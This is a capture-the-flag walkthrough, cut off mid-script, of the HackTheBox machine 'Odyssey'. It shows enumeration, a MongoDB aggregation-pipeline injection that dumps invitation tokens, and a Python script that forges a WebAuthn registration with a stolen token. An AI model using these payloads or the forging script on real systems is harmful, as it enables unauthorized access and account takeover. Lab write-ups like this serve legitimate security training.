---
title: Odyssey
date: 2026-09-17
excerpt: HackTheBox - Insane
cover: ../uploads/cover_odyssey.jpg
tags: NoSQL Aggregation Pipeline Injection, Arbitrary File Read via Prototype Pollution, BULK INSERT Query Coercion, AddKeyCredentialLink Abuse, YAML Deserialization RCE, DCSync 
---

Today, I’ll be walking through my complete approach to **Odyssey**, an **Insane-rated Windows machine** on Hack The Box. Odyssey was one of the most challenging machines I have personally worked on, not because of a single extremely difficult vulnerability, but because of how many different techniques had to be chained together to reach the final objective.

The machine was released on **June 23, 2026**, and was created by **xRogue**. It has since been retired, allowing the full attack path to be documented.

What makes Odyssey particularly interesting is the variety of technologies and attack techniques involved. The attack path involves web application exploitation, authentication and API weaknesses, source-code analysis, local file disclosure, database interaction, command execution, privilege escalation, credential extraction, Active Directory abuse, lateral movement, and exploitation of a .NET application.

Rather than being a machine where finding one vulnerability immediately leads to root or Administrator, Odyssey requires you to continuously **enumerate, analyze what you discover, and connect seemingly unrelated pieces of information together**. Information obtained from one stage can become the key to progressing through another stage later in the attack chain.

Because of this, Odyssey felt less like solving a single vulnerability and more like working through a complete multi-stage penetration test. There were several points where I had to step back, re-enumerate the environment, and figure out how the information I had already collected could be used to move forward.

> **A Note Before We Begin**
>
> This is going to be a **long and fairly complex writeup**. Odyssey has a lot of moving parts, and some sections may require you to slow down and understand what is happening rather than simply copying the commands.
>
> If you're working through the machine yourself, **keep going and give it your best effort**. Don't be discouraged if you get stuck or if some of the techniques aren't immediately familiar. Take your time to understand *why* each step works and how one discovery leads to another.
>
> In my opinion, that's where the real value of a machine like Odyssey comes from. You aren't just learning how to exploit one vulnerability—you'll encounter multiple areas of penetration testing and see how they can be chained together during a real engagement.
>
> **Try to solve each section yourself before reading ahead whenever possible.** Even if you eventually need the writeup for a hint, understanding the reasoning behind the solution will teach you much more than simply reproducing the commands.
>
> By the end of this machine, you'll have encountered a wide range of techniques and, hopefully, picked up a few new ideas that you can apply to your own labs and assessments.

In this writeup, I'll document the attack path step by step, including the enumeration, the reasoning behind each decision, the commands used, important findings, failed approaches where relevant, and how the different vulnerabilities and credentials were chained together to eventually compromise the environment.

# Web Enumeration

With that said, let's begin with **enumeration**.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nmap -A -T5 10.129.45.209
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-15 18:58 EDT
Nmap scan report for aegis.korvia.htb (10.129.45.209)
Host is up (0.14s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
| http-title: Authentication \xE2\x80\x94 AEGIS
|_Requested resource was /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 3000/tcp)
HOP RTT       ADDRESS
1   122.36 ms 10.10.14.1
2   122.98 ms aegis.korvia.htb (10.129.45.209)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.49 seconds
```

The first step is to perform a basic reconnaissance scan against the target using **Nmap**. I used `-A` for aggressive scanning, which enables service/version detection, OS detection, default scripts, and traceroute, while `-T5` increases the scan speed. The target responds as `aegis.korvia.htb`, and only **TCP port 3000** is exposed. The service running there is an **HTTP server powered by Node.js Express**, with the title `Authentication — AEGIS` and `/login` as the requested resource. This immediately suggests that the web application will likely be the primary entry point.

The OS detection indicates that the target is probably running **Windows Server**, although Nmap explicitly warns that the result may be unreliable because there wasn't enough information from open/closed ports to make a confident determination. The important finding at this stage is therefore not the exact OS version, but the exposed **Node.js web application on port 3000**. From here, the logical next step is to investigate the web application, its authentication mechanism, and the available endpoints rather than blindly attacking the operating system.

Add this to /etc/hosts:

```plaintext
# /etc/hosts

10.129.45.209   aegis.korvia.htb
```

When we access the web application, we are automatically redirected to the `/login` endpoint. The login page does not provide the usual username and password fields; instead, it relies exclusively on **hardware-based authentication**, indicating that the application uses a stronger authentication mechanism rather than traditional credentials.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkoJddAx3eCyKXl1i8MpL%252FScreenshot%2520%283375%29.png%3Falt%3Dmedia%26token%3D855e2177-6030-4224-a57c-3d25f011f314&width=768&dpr=3&quality=100&sign=6b151d6977b64686411617179b7b60d5&sv=3)

To better understand the authentication mechanism, we can attempt a dummy authentication request using an arbitrary username. This triggers a `POST` request to the `/api/v1/auth/webauthn/auth/begin` endpoint, which appears to initiate the **WebAuthn authentication process** for the specified user:

```json
{"rpId":"aegis.korvia.htb","challenge":"b14nhcLj9Fz34wGci-Aa2jW87vAfMLXYgL1HcOhjirI","allowCredentials":[],"timeout":60000,"userVerification":"preferred"}
```

Even from this request, we can already gather a few useful details about the application. The presence of `/api/v1` indicates that the application exposes a versioned API, while the endpoint itself confirms that **WebAuthn** is being used as the backend authentication mechanism. While continuing to enumerate the application in the background, additional API endpoints were discovered through fuzzing, giving us a better understanding of the available attack surface.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ feroxbuster -u http://aegis.korvia.htb:3000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
...
200      GET        1l     4378c        http://aegis.korvia.htb:3000/login
301      GET        1l      153c        http://aegis.korvia.htb:3000/img → http://aegis.korvia.htb:3000/img/
301      GET        1l      153c        http://aegis.korvia.htb:3000/css → http://aegis.korvia.htb:3000/css/
301      GET        1l      152c        http://aegis.korvia.htb:3000/js → http://aegis.korvia.htb:3000/js/
302      GET        1l       28c        http://aegis.korvia.htb:3000/account → http://aegis.korvia.htb:3000/login
302      GET        1l       28c        http://aegis.korvia.htb:3000/status → http://aegis.korvia.htb:3000/login
302      GET        1l       28c        http://aegis.korvia.htb:3000/logout → http://aegis.korvia.htb:3000/login
302      GET        1l       28c        http://aegis.korvia.htb:3000/dashboard → http://aegis.korvia.htb:3000/login
302      GET        1l       28c        http://aegis.korvia.htb:3000/requests → http://aegis.korvia.htb:3000/login
400      GET        1l     2543c        http://aegis.korvia.htb:3000/onboard
```

Most of the endpoints discovered during enumeration redirect back to `/login`, suggesting that the application heavily restricts access to authenticated users. However, one endpoint stood out: `/onboard`. Unlike the others, this endpoint returned a **HTTP 400 Bad Request** response instead of redirecting to the login page. This difference makes `/onboard` worth investigating further, as it may expose functionality that behaves differently from the rest of the application.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsVM3qGunU90LpkpNhoa9%252FScreenshot%2520%283393%29.png%3Falt%3Dmedia%26token%3D1d63fe46-f3dc-4758-835a-0cf7168379a1&width=768&dpr=3&quality=100&sign=e442f15820472a0c7369d76b87188fb4&sv=3)

Based on the information provided by the `/onboard` endpoint, the registration process appears to require an **invitation token** associated with an existing operator. The token is also described as **single-use**, meaning it should be invalidated after a successful onboarding attempt. To understand how this mechanism works, we followed the application's instructions and submitted a dummy invitation token to observe how the server responds.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuF0uXejZwWSWja2MJMnu%252FScreenshot%2520%283395%29.png%3Falt%3Dmedia%26token%3Daa25c351-0986-40c3-9f7c-a5dab0c8e714&width=768&dpr=3&quality=100&sign=17c22f525ca4633f25b42353b1cd8a4c&sv=3)

From the response, we can determine that the application maintains a `pending_invites` list. This suggests that invitation tokens which have not yet been redeemed are stored or tracked there, making this list potentially relevant to understanding how the onboarding process handles unused invitations.

While inspecting the application's traffic in `BurpSuite`, I came across an additional endpoint that caught my attention:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FO2ubqgVN5CrV9yW44tOT%252FScreenshot%2520%283396%29.png%3Falt%3Dmedia%26token%3D5713f8b1-c2b9-4891-91ed-5f2899706a57&width=768&dpr=3&quality=100&sign=bc118bfd8d5e64a8e550b123b8a89aee&sv=3)

The endpoint appears to retrieve **AAGUID metadata** associated with WebAuthn/FIDO authenticators. An **AAGUID (Authenticator Attestation Globally Unique Identifier)** is a unique identifier used to identify the model or type of an authenticator, such as a hardware security key or a platform authenticator. In the context of WebAuthn, it can provide information about the authenticator involved in the authentication process, rather than identifying the individual user directly.

At this stage, the information returned by the endpoint does not appear to provide anything immediately useful for gaining access. However, the endpoint is still interesting from an application-security perspective because it appears to retrieve information through backend database queries. This gives us another potential attack surface to investigate, particularly how the application handles user-controlled input when constructing or executing those queries.

# NoSQL Injection via Aggregation Pipeline

The first step is to determine what type of database is being used by the application. To do this, we can test the endpoint with several different inputs designed to reveal how the backend processes our requests. One of the tests involves the classic NoSQL injection `$ne` operator, which produces a noticeably different response and provides an initial indication that the application may be interacting with a **NoSQL database**.

```shell
┌──(kuroshiro㉿a1sberg)-[~]
└─$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q\[$ne\]=test&limit=2' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   158  100   158    0     0     37      0  0:00:04  0:00:04 --:--:--    37
{
  "error": "InvalidQueryShape",
  "detail": "Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.",                                                                                                  
  "trace_id": "mds-ad3a6c"
}
```

The different responses strongly suggest that the application is backed by a **NoSQL database**, with **MongoDB** being the most likely candidate. We also notice that the application references a parameter named `pipeline`. This is particularly interesting because MongoDB supports **aggregation pipelines**, which allow multiple stages to process and transform documents returned from a collection.

With this in mind, we can investigate how the `pipeline` parameter is handled by the application. We start with a simple aggregation request that attempts to return a single document. By observing the response and gradually modifying the pipeline, we can determine how the backend processes our input and gain a better understanding of the underlying database behavior.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=%5B%7B%22%24facet%22%3A%7B%22x%22%3A%5B%7B%22%24lookup%22%3A%7B%22from%22%3A%22pending_invites%22%2C%22pipeline%22%3A%5B%5D%2C%22as%22%3A%22y%22%7D%7D%5D%7D%7D%5D' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  303k  100  303k    0     0   131k      0  0:00:02  0:00:02 --:--:--  131k
[
  {
    "x": [
      {
        "_id": "69f49023225fb3c680909240",
        "aaguid": "566581a4-5a65-9f87-c652-52851474f127",
        "vendor": "Yubico",
        "description": "YubiKey 5C",
        "protocolFamily": "fido2",
        "schema": 3,
        "authenticatorVersion": 100,
        "upv": [
          {
            "major": 1,
            "minor": 0
          }
        ],
        "authenticationAlgorithms": [
          "secp256r1_ecdsa_sha256_raw"
        ],
        "publicKeyAlgAndEncodings": [
          "cose"
        ],
        "attestationTypes": [
          "basic_full",
          "basic_surrogate"
        ],
        "userVerificationDetails": [
          [
            {
              "userVerificationMethod": "presence_internal"
            }
          ]
        ],
        "keyProtection": [
          "hardware",
          "secure_element"
        ],
        "matcherProtection": [
          "on_chip"
        ],
        "attachmentHint": [
          "external"
        ],
        "isSecondFactorOnly": false,
        "tcDisplay": [],
        "attestationRootCertificates": [
          "MIIB...redacted-root-cert-0..."
        ],
        "icon": "data:image/png;base64,iVBORw0KGgo...",
        "supportedTransports": [
          "usb"
        ],
        "certificationStatus": "FIDO_CERTIFIED_L1",
        "statusReports": [
          {
            "status": "FIDO_CERTIFIED",
            "effectiveDate": "2024-01-15"
          },
          {
            "status": "FIDO_CERTIFIED_L1",
            "effectiveDate": "2025-06-01"
          }
        ],
        "timeOfLastStatusChange": "2025-06-01",
        "y": [
          {
            "_id": "69f49023225fb3c680909274",
            "operator_id": "op-2026-0042",
            "role": "Operator",
            "token": "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238",
            "issued_by": "ao-mreyes",
            "issued_at": "2026-04-15T08:00:00.000Z",
            "expires_at": "2126-05-15T00:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c680909275",
            "operator_id": "op-2026-0051",
            "role": "Operator",
            "token": "d6fe33f9f9402c666fe166f2be911cb6b98d054c5be5a9921312ae1d51c72fdc",
            "issued_by": "ao-jchen",
            "issued_at": "2026-04-15T17:00:00.000Z",
            "expires_at": "2026-05-15T17:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c680909276",
            "operator_id": "op-2026-0067",
            "role": "Operator",
            "token": "a489a3bceb35fbbafa810109d12cf2ada4f81521e448ce6ecd17e80169ceb610",
            "issued_by": "ao-tnemec",
            "issued_at": "2026-04-16T02:00:00.000Z",
            "expires_at": "2026-05-16T02:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c680909277",
            "operator_id": "op-2026-0073",
            "role": "Operator",
            "token": "bf97e87e26f16b123156ef6304b99b87169ed37f59672386bb45aa5f31361831",
            "issued_by": "ao-mreyes",
            "issued_at": "2026-04-16T11:00:00.000Z",
            "expires_at": "2026-05-16T11:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c680909278",
            "operator_id": "op-2026-0088",
            "role": "Operator",
            "token": "905da2f3ef7df0af4279d53bcfd34a12e11f054c9409b8687f64f405bb5dfabf",
            "issued_by": "ao-jchen",
            "issued_at": "2026-04-16T20:00:00.000Z",
            "expires_at": "2026-05-16T20:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c680909279",
            "operator_id": "op-2026-0094",
            "role": "Operator",
            "token": "8da6e567833c9bc1c4599a32e199343f8b2401c38b7c70a663b5e191fcfedf29",
            "issued_by": "ao-tnemec",
            "issued_at": "2026-04-17T05:00:00.000Z",
            "expires_at": "2026-05-17T05:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c68090927a",
            "operator_id": "op-2026-0105",
            "role": "Operator",
            "token": "0030389d1302325dd93ea234496e035eb1c8a043e0db4e92e3e4f7ee1cafc91f",
            "issued_by": "ao-mreyes",
            "issued_at": "2026-04-17T14:00:00.000Z",
            "expires_at": "2026-05-17T14:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c68090927b",
            "operator_id": "op-2026-0117",
            "role": "Operator",
            "token": "5fa38ae0ebbd309553386c8518a3b9fc6930547905dfb81442b1e5fa6e1a7e78",
            "issued_by": "ao-jchen",
            "issued_at": "2026-04-17T23:00:00.000Z",
            "expires_at": "2026-05-17T23:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c68090927c",
            "operator_id": "op-2026-0124",
            "role": "Operator",
            "token": "e61d596e6f7e703e2732471f5dee6e7967c41760557d6d805c2ce1644c12ad22",
            "issued_by": "ao-tnemec",
            "issued_at": "2026-04-18T08:00:00.000Z",
            "expires_at": "2026-05-18T08:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c68090927d",
            "operator_id": "op-2026-0138",
            "role": "Operator",
            "token": "67ff132335e9b42551519f420e73f2c4fd999e11cd1e111cb931d4c9371ed72b",
            "issued_by": "ao-mreyes",
            "issued_at": "2026-04-18T17:00:00.000Z",
            "expires_at": "2026-05-18T17:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c68090927e",
            "operator_id": "op-2026-0149",
            "role": "Operator",
            "token": "baf82f30d6134429c5ae8188f9860b6c6ab3431d4957e566709034fa06367f57",
            "issued_by": "ao-jchen",
            "issued_at": "2026-04-19T02:00:00.000Z",
            "expires_at": "2026-05-19T02:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c68090927f",
            "operator_id": "op-2026-0163",
            "role": "Operator",
            "token": "3a155c14f046aec7fc7469316ae72ecd3dc7f7c4f18044e2c37c3dc1b0753cb9",
            "issued_by": "ao-tnemec",
            "issued_at": "2026-04-19T11:00:00.000Z",
            "expires_at": "2026-05-19T11:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
...
```

The response confirms our earlier assumption about how the application handles the `pipeline` parameter. As expected with MongoDB's aggregation framework, the pipeline is processed through individual stages, and applying a `limit` stage successfully restricts the result to a single document. This confirms that our input is being interpreted as an aggregation pipeline by the backend.

To understand the potential impact of the injectable `pipeline` parameter, we researched how **MongoDB aggregation pipelines** can be abused when user-controlled input is passed to the database without proper validation. This led us to [documentation](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines) and security research covering **MongoDB aggregation pipeline injection**, including techniques for retrieving information from collections other than the one being queried directly.

This is particularly relevant to our situation because the application previously revealed the existence of a `pending_invites` collection during the onboarding investigation. Since this collection may contain unused invitation data, our next step is to determine whether the aggregation pipeline can be manipulated to access documents from that collection and extract useful information.

Further testing reveals that the application applies restrictions to the aggregation pipeline and blocks several potentially useful stages. Operators such as `$unionWith` and `$merge`, along with other functionality that could allow interaction with additional collections, are rejected by the application.

With these restrictions in place, the previously considered approach of accessing another collection through the existing pipeline is no longer viable. Since `pending_invites` is the collection we are interested in, we instead need to look for a way to interact with it directly and determine whether its contents can be retrieved through another part of the application's functionality.

After a lot of trial and errors, we found a way to work around the application's restrictions and access the `pending_invites` collection through the aggregation pipeline.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=%5B%7B%22%24limit%22%3A1%7D%2C%7B%22%24facet%22%3A%7B%22x%22%3A%5B%7B%22%24lookup%22%3A%7B%22from%22%3A%22pending_invites%22%2C%22pipeline%22%3A%5B%5D%2C%22as%22%3A%22y%22%7D%7D%2C%7B%22%24unwind%22%3A%22%24y%22%7D%2C%7B%22%24replaceRoot%22%3A%7B%22newRoot%22%3A%22%24y%22%7D%7D%5D%7D%7D%5D' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5014  100  5014    0     0  19598      0 --:--:-- --:--:-- --:--:-- 19585
[
  {
    "x": [
      {
        "_id": "69f49023225fb3c680909274",
        "operator_id": "op-2026-0042",
        "role": "Operator",
        "token": "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238",
        "issued_by": "ao-mreyes",
        "issued_at": "2026-04-15T08:00:00.000Z",
        "expires_at": "2126-05-15T00:00:00.000Z",
        "redeemed": false,
        "pipeline": "forge-recruitment",
        "clearance_target": "Δ-3"
      },
...
```

The request uses the `$facet` stage to create a separate pipeline, where `$lookup` is used to reference the `pending_invites` collection. The returned documents are then processed with `$unwind` and `$replaceRoot` so that the invitation records become the main result.

The response confirms that the technique worked. We can now see documents from `pending_invites`, including the `operator_id`, assigned `role`, invitation `token`, issuer, expiration date, and whether the invitation has already been redeemed. Most importantly, the `redeemed` field is set to `false`, indicating that the discovered invitation is still active and has not yet been consumed. This gives us a potentially valid invitation token that can be investigated further as part of the application's onboarding process.

# WebAuthn Synthetic Registration and userHandle Confusion

With a valid invitation token now identified, we can proceed to the next stage of the attack. The token can be supplied to the application's `/onboard` endpoint to attempt registering a new user and gain access to the authenticated portion of the application.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FchileY99f4BnXh8hV4VC%252FScreenshot%2520%283394%29.png%3Falt%3Dmedia%26token%3D88650d83-1a60-4bcf-9d93-a10fcfd12316&width=768&dpr=3&quality=100&sign=15de3ccac97078cd68c2b1c2171e9e51&sv=3)

When we select **“Begin Authenticator Attestation”**, the application refuses to proceed and indicates that authenticator attestation is only permitted when the request originates from `localhost`. To investigate why this restriction is being triggered, we inspect the request in Burp Suite. We can see a `POST` request being sent to `/api/v1/auth/webauthn/register/login`, along with the JSON response generated by the server.

The response contains the information required to begin a WebAuthn registration ceremony. It provides a **challenge**, the relying party (RP) information for `aegis.korvia.htb`, and the user identity associated with the newly onboarded operator. It also specifies the supported public-key algorithms, a 60-second timeout, and `attestation: none`, meaning the server is not requesting an attestation statement from the authenticator. The `authenticatorSelection` section is also notable: a **resident/discoverable credential is required**, while user verification is preferred. These details give us a clearer picture of how AEGIS expects the WebAuthn registration process to operate.

```json
{
  "challenge": "-QQ1_1X-ll9NairFqL3T6NlBGgjoSLusNeHgDvL16UA",
  "rp": {
    "name": "AEGIS — Sovereign Signing & Attestation Authority",
    "id": "aegis.korvia.htb"
  },
  "user": {
    "id": "b3AtMjAyNi0wMDQy",
    "name": "op-2026-0042",
    "displayName": "op-2026-0042"
  },
  "pubKeyCredParams": [
    {
      "alg": -7,
      "type": "public-key"
    },
    {
      "alg": -257,
      "type": "public-key"
    }
  ],
  "timeout": 60000,
  "attestation": "none",
  "excludeCredentials": [],
  "authenticatorSelection": {
    "residentKey": "required",
    "userVerification": "preferred",
    "requireResidentKey": true
  },
  "extensions": {
    "credProps": true
  }
}
```

There is quite a bit of information contained in the WebAuthn response, and some of these fields will become more relevant as we continue. For now, the most important detail is the value of `"attestation": "none"`. In a WebAuthn registration ceremony, this tells the client that the relying party does not require an attestation statement proving the identity or provenance of the physical authenticator. As a result, we do not necessarily need an actual hardware security key to construct the registration response.

Although the browser interface refuses to complete the registration because the application restricts authenticator attestation to `localhost`, the underlying registration API remains accessible. This gives us an opportunity to interact with the WebAuthn endpoints directly instead of relying on the browser's built-in WebAuthn implementation. By combining the previously obtained invitation token with the registration parameters returned by the server, we can generate our own cryptographic credential and construct the required WebAuthn registration data. The following script automates that process and attempts to register the generated credential with AEGIS.

```python
#!/usr/bin/env python3

import os
import json
import hashlib
import struct
import pickle
import requests
import cbor2

from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization


TARGET = "http://aegis.korvia.htb:3000"
DOMAIN = "aegis.korvia.htb"
SITE_ORIGIN = f"{TARGET}"

INVITATION = (
    "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238"
)


def create_keypair():
    """Generate a P-256 keypair and return the private key and COSE public key."""

    signing_key = ec.generate_private_key(ec.SECP256R1())
    coordinates = signing_key.public_key().public_numbers()

    def encode_coordinate(value):
        return value.to_bytes(32, byteorder="big")

    cose_key = {
        1: 2,                       # EC2
        3: -7,                      # ES256
        -1: 1,                      # P-256
        -2: encode_coordinate(coordinates.x),
        -3: encode_coordinate(coordinates.y),
    }

    return signing_key, cose_key


def build_attestation(credential, cose_key):
    """Construct a minimal 'none' WebAuthn attestation object."""

    relying_party_hash = hashlib.sha256(DOMAIN.encode()).digest()

    # User Present + User Verified
    auth_flags = bytes([0x41])

    # Initial signature counter
    signature_counter = struct.pack(">I", 1)

    authenticator_guid = b"\x00" * 16
    credential_size = struct.pack(">H", len(credential))

    credential_data = (
        authenticator_guid
        + credential_size
        + credential
        + cbor2.dumps(cose_key)
    )

    authenticator_data = (
        relying_party_hash
        + auth_flags
        + signature_counter
        + credential_data
    )

    return cbor2.dumps({
        "fmt": "none",
        "attStmt": {},
        "authData": authenticator_data,
    })


def make_client_data(raw_challenge):
    """Create the WebAuthn clientDataJSON structure."""

    challenge_text = websafe_encode(raw_challenge)

    document = {
        "type": "webauthn.create",
        "challenge": challenge_text,
        "origin": SITE_ORIGIN,
        "crossOrigin": False,
    }

    return json.dumps(
        document,
        separators=(",", ":")
    ).encode()


def save_credential(path, private_key, credential_id, account_id):
    """Serialize the generated credential information to disk."""

    private_bytes = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    record = {
        "priv_pem": private_bytes,
        "cred_id": credential_id,
        "user_id": account_id,
    }

    with open(path, "wb") as output:
        pickle.dump(record, output)


def main():
    http = requests.Session()

    # Obtain registration parameters.
    response = http.post(
        f"{TARGET}/api/v1/auth/webauthn/register/begin",
        json={"invite_token": INVITATION},
    )
    response.raise_for_status()

    registration = response.json()

    raw_challenge = websafe_decode(registration["challenge"])
    account_identifier = websafe_decode(registration["user"]["id"])

    print(f"[*] Registration initialized for user: {account_identifier.decode()}")

    # Generate our authenticator keypair.
    private_key, public_cose = create_keypair()
    credential_identifier = os.urandom(32)

    # Build the authenticator response.
    attestation = build_attestation(
        credential_identifier,
        public_cose,
    )

    browser_data = make_client_data(raw_challenge)

    registration_payload = {
        "id": websafe_encode(credential_identifier),
        "rawId": websafe_encode(credential_identifier),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(browser_data),
            "attestationObject": websafe_encode(attestation),
        },
        "clientExtensionResults": {},
    }

    # Complete WebAuthn registration.
    result = http.post(
        f"{TARGET}/api/v1/auth/webauthn/register/finish",
        json=registration_payload,
    )

    print(f"[*] Server response: HTTP {result.status_code}")

    if not result.ok:
        print(f"[!] Registration failed: {result.text}")
        result.raise_for_status()

    # Persist the generated credential.
    output_file = "aegis_cred.pkl"

    save_credential(
        output_file,
        private_key,
        credential_identifier,
        account_identifier,
    )

    print(f"[+] WebAuthn credential registered successfully")
    print(f"[+] Credential ID: {credential_identifier.hex()}")
    print(f"[+] Credential stored in: {output_file}")


if __name__ == "__main__":
    main()
```

The script essentially acts as a custom WebAuthn client that performs the registration process without relying on a physical security key or the browser's WebAuthn interface. It first sends the invitation token to the registration endpoint to obtain the challenge and user information. It then generates a new P-256 key pair and builds the corresponding COSE public-key structure required by WebAuthn. From there, it constructs the authenticator data and client data, including the RP ID hash, credential ID, public key, challenge, and origin. These values are encoded into the format expected by the application's `/register/finish` endpoint.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ python3 register.py
[*] Registration initialized for user: op-2026-0042
[*] Server response: HTTP 200
[+] WebAuthn credential registered successfully
[+] Credential ID: a7f4b8bd2ca90f327f3aaaabdb9abac62fe516a2e32878263b9ba9043560ebca
[+] Credential stored in: aegis_cred.pkl
```

After constructing the registration response, the script submits it directly to the server and checks whether the registration was successful. If accepted, it saves the generated private key, credential ID, and user ID into `aegis_cred.pkl`, allowing the generated credential to be reused later for authentication. In other words, instead of interacting with WebAuthn through the browser and a physical authenticator, the script manually creates the necessary WebAuthn registration data and communicates directly with the application's API.

At this point, we can use the credential generated during registration to create a custom WebAuthn authentication script. The goal is to reproduce the authentication process normally handled by the browser and authenticator, then obtain the application's session cookie after successful authentication.

```python
#!/usr/bin/env python3
import hashlib
import json
import pickle
import struct
import requests

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from fido2.utils import websafe_decode, websafe_encode


SERVER = "http://aegis.korvia.htb:3000"
RELYING_PARTY = "aegis.korvia.htb"
ORIGIN_URL = SERVER
CREDENTIAL_FILE = "aegis_cred.pkl"


def read_credential(filename):
    """Recover the locally stored WebAuthn credential."""

    with open(filename, "rb") as handle:
        stored = pickle.load(handle)

    key = serialization.load_pem_private_key(
        stored["priv_pem"],
        password=None,
    )

    return {
        "private_key": key,
        "credential_id": stored["cred_id"],
        "user_id": stored["user_id"],
    }


def construct_authenticator_data(counter_value=2):
    """Create the authenticatorData portion of the assertion."""

    rp_hash = hashlib.sha256(
        RELYING_PARTY.encode()
    ).digest()

    user_present = bytes([0x01])
    signature_counter = struct.pack(">I", counter_value)

    return rp_hash + user_present + signature_counter


def construct_client_data(challenge):
    """Build the WebAuthn clientDataJSON document."""

    client_document = {
        "type": "webauthn.get",
        "challenge": websafe_encode(challenge),
        "origin": ORIGIN_URL,
        "crossOrigin": False,
    }

    return json.dumps(
        client_document,
        separators=(",", ":"),
    ).encode()


def generate_assertion_signature(private_key, authenticator_data, client_data):
    """Sign the WebAuthn assertion payload."""

